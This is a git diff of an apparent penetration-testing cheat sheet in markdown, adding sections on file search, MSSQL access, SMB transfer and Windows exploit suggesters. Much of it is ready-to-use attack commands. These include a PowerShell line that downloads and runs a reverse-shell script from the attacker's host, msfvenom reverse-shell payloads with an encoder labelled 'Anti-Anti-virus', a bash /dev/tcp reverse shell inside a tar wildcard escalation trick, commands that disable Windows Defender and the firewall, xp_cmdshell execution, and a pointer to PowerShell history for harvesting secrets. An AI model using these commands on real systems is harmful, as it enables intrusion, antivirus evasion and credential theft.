@@ -88,6 +88,14 @@
 	- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
 	- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
 ## Shell
+### Linux Shell
+- Find File
+    - `find  / -iname {file_name} -print 2>/dev/null`
+	- `du -a 2>/dev/null | grep {file_name}`
+	- `tar cf - $PWD 2>/dev/null | tar tvf - | grep {file_name}`
+### Windows Shell
+- List all data
+	- `dir /a`
 ### Reverse Shell - Linux
 - Prepare
 	- `nc -nvlp {port}`
@@ -101,7 +109,7 @@
     	- Write file in local first, and use wget/curl to get to victim machine
 - Make it moreinteractively
     - `python -c 'import pty; pty.spawn("/bin/bash")'`
-### Reverse shell - Windows
+### Reverse Shell - Windows
 - msfvenom
 	- https://infinitelogins.com/2020/01/25/sfvenom-reverse-shell-payload-cheatsheet/
 	- aspx
@@ -111,6 +119,8 @@
 			- msf `multi/handler` to receive
 	- exe
 		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell-x86.exe`
+		- msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f exe > shell.ex
+			- Anti-Anti-virus
 - Powershell
 	- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`
@@ -138,6 +148,11 @@
 		- `wget` , `curl` , `iwr` is alias for `Invoke-WebRequest`
 			- `Invoke-WebRequest http://{my_ip}:{my_port}/{file} -outFile {file_name}`
         - `certutil -urlcache -f {URL} {File_name}`
+- SMB
+	- `impacket-smbserver meow .`
+		- In Kali
+	- `copy \\{IP}\meow\{filename} {filename}`
+		- In Windows
 - Pack file
 	- cab
 		- `lcab -r {dir} {file.cab}`
@@ -157,6 +172,12 @@
 		- Write web shell
 	- `save`
 		- Save file
+## MSSQL
+- Connect
+	- `impacket-mssqlclient -p {port} {UserID}@{IP} -windows-auth`
+	- Default port : 1433
+- Shell
+	- `exec xp_cmdshell '{Command}`
 ## Privilege - Linux
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
@@ -186,10 +207,7 @@ Scan the system to find which can be use for privileges escalation
 	- We can modify this by
 		- `PATH=/my/fake/path:$PATH ./binary`
 	- Fake path can contain the shell/reverse shell command fle
-- Find File
-    - `find  / -iname {file_name} -print 2>/dev/null`
-	- `du -a 2>/dev/null | grep {file_name}`
-	- `tar cf - $PWD 2>/dev/null | tar tvf - | grep {file_name}`
+
 ### Program
 - `tar` Wildcard
 	- `echo "{bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'}" > shell.sh`
@@ -246,13 +264,21 @@ Scan the system to find which can be use for privileges escalation
 	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
 -  Turn off firewall
 	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
-## Check vulnerability
+### Check vulnerability
 - [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 	- `systeminfo`
 		- Run in target machine and save to txt file
 	- `windows-exploit-suggester.py --update`
 		- Get new database
-	- `windows-exploit-suggester.py --database {Database file} --systeminfo {systemfile}`
+	- `windows-exploit-suggester.py --database {Database file} --systeminfo {systeminfofile}`
+- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
+	- `systeminfo`
+	- `python3 wesng.py --update`
+	- `python3 wesng.py {systeminfofile}`
+### Sensitive data
+- PowerShell History Path
+	- `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt `
+
 ## Password Crack
 ### Software
 - Hydra
@@ -293,6 +319,7 @@ Scan the system to find which can be use for privileges escalation
 	- `file {file_name}`
 	- `binwalk {file_name}`
 	- `xxd {file_name}`
+
 ### Steganography
 - [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
 - [zsteg](https://github.com/zed-0xff/zsteg)
@@ -302,7 +329,6 @@ Scan the system to find which can be use for privileges escalation
 
 <!-- todo
 chisel
-
 XXE
 
 
